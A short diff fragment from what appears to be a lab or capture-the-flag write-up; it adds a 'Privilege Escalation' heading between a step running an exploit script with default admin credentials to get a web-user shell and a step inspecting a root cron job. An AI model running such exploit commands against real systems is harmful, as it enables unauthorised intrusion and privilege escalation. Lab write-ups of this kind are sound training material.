@@ -41,6 +41,8 @@ $ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+## Privilege Escalation  
+
 We found that there is a cron job running every minute by root
 ```
 $ cat /etc/crontab  
